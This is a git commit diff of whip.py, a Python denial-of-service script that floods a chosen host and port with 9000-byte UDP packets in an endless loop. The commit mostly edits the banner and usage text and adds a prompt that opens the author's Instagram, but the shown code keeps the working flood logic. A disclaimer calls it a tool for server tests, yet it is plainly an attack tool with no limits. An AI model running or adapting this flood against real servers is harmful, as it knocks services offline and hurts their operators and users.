8c7a55f80a3328877b5ca087c27c12bdb58bbdb1
cyclopsfenks123123 <86158346+fatihkeeles@users.noreply.github.com>
2022-09-20 15:02:23 +0300

    whip

--- whip.py
+++ whip.py
@@ -8,37 +8,44 @@ from termcolor import colored
 
 subprocess.call(["clear"])
 
-
 def banner():
     print(colored("""
- ▄█     █▄     ▄█    █▄     ▄█     ▄███████▄ 
-███     ███   ███    ███   ███    ███    ███ 
-███     ███   ███    ███   ███▌   ███    ███ 
-███     ███  ▄███▄▄▄▄███▄▄ ███▌   ███    ███ 
-███     ███ ▀▀███▀▀▀▀███▀  ███▌ ▀█████████▀  
-███     ███   ███    ███   ███    ███        
-███ ▄█▄ ███   ███    ███   ███    ███        
- ▀███▀███▀    ███    █▀    █▀    ▄████▀                          
+	 ▄█     █▄     ▄█    █▄     ▄█     ▄███████▄ 
+	███     ███   ███    ███   ███    ███    ███ 
+	███     ███   ███    ███   ███▌   ███    ███ 
+	███     ███  ▄███▄▄▄▄███▄▄ ███▌   ███    ███ 
+	███     ███ ▀▀███▀▀▀▀███▀  ███▌ ▀█████████▀  
+	███     ███   ███    ███   ███    ███        
+	███ ▄█▄ ███   ███    ███   ███    ███        
+	 ▀███▀███▀    ███    █▀    █▀    ▄████▀             
     ""","green"))
-
+    print(colored("	Version : 1.1","red"))
 banner()
+
 
 def usage():
 	print(colored("""
-Whip Dos script version 1.0 
-by fatih keles[TR] https://www.webfatihkeles.com
-Whip of Tengri !
-Can only be used for server tests !
-It is illegal to use, the user is responsible for the provisions !
-
-Usage:
-python3 whip.py -H <target host> -p <port number>
--h, --help : help message
--H, --host : Server IP address
--p, --port : port (default : 80)""","green"))
+	*********************************************************************
+	Creator : @fatihkeeles
+	https://www.webfatihkeles.com
+	Can only be used for server tests ! Your ip is visible.
+	It is illegal to use, the user is responsible for the provisions !
+	---------------------------------------------------------------------
+	Usage:
+	python3 whip.py -H <target host> -p <port number>
+	-h, --help : help message
+	-H, --host : Server IP address
+	-p, --port : port (default : 80)
+	 --------------------------------------------------------------------"""
+	,"yellow"))
+	print(colored
+	("	Bug Reporties link :","blue"))
+	print(colored
+	("	www.instagram.com/fatihkeeles","red"))
+	print(colored("	**********************************************************************","yellow"))
 usage()
 
-def main():
+def program():
 
     con = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = random._urandom(9000)
@@ -54,6 +61,7 @@ def main():
     if (options.tgtPort == None):
     	tgtPort = 80
          
+
     counter = 0
 
     try:
@@ -61,15 +69,25 @@ def main():
             con.sendto(data, (tgtHost,tgtPort))
             counter += 1
             print(colored("Packet send %d " % (counter),"red"),tgtHost)
+            
+    
     except KeyboardInterrupt:
         print(colored("""
 [!] Attack stopped
         ""","yellow"))
-        exit()
+        opinion = input(colored("Would you like to let us know your opinion about the script? (Y / N) : ","blue"))
+        if (opinion == "Y") or (opinion == "y"):
+        	subprocess.call(["firefox", "https://www.instagram.com/fatihkeeles"])
+        else:
+        	exit()
+    
+    
     except socket.error as e:
     	print(colored("""
 [!] check server ip and port
     	""","yellow"))
+    
+    
     except:
     	print("")
-main()
+program()
